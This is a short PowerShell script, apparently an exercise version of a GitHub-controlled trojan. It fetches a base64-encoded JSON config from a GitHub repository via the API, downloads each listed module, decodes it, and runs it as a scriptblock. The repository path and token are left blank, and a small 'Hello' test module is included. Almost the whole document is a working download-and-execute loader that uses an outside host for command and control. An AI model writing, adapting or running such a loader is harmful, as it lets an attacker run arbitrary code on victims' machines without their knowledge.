[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;

$trojan_id = "abc"

$trojan_config = $trojan_id + ".json"
$data_path = "data/" + $trojan_id + "/"
$headers = @{ 'Authorization' = 'token ' }
$myRepoBaseUri = "https://api.github.com/repos/"


$hoge = {function Hello {"Hello!"}}
$test = New-module -Scriptblock $hoge  -name hoge -AsCustomObject
$test.hello()

function Get_File_Contents($filename)
{
    $treeshatargeturi = $myRepoBaseUri + "branches/master"
    $treesha = (Invoke-RestMethod -Uri $treeshatargeturi -Headers $headers).commit.commit.tree.sha

    $treetargeturi = $myRepoBaseUri + "git/trees/" + $treesha + "?recursive=1"
    $tree = (Invoke-RestMethod -Uri $treetargeturi -Headers $headers)

    foreach($obj in $tree.tree)
    {
        if($obj.path.Contains($filename))
        {
            $contents = (Invoke-RestMethod -Uri $obj.url -Headers $headers)
            return $contents.content
        }
    }
}

$config_content = Get_File_Contents($trojan_config)
$config = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($config_content)) | ConvertFrom-Json

foreach($pgobj in $config.module)
{
    $pg_content = Get_File_Contents($pgobj)

    $pg = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($pg_content))
    $pg_block = [Scriptblock]::Create($pg)
    $run = New-module -Scriptblock $pg_block -name run -AsCustomObject
    $run.run()
}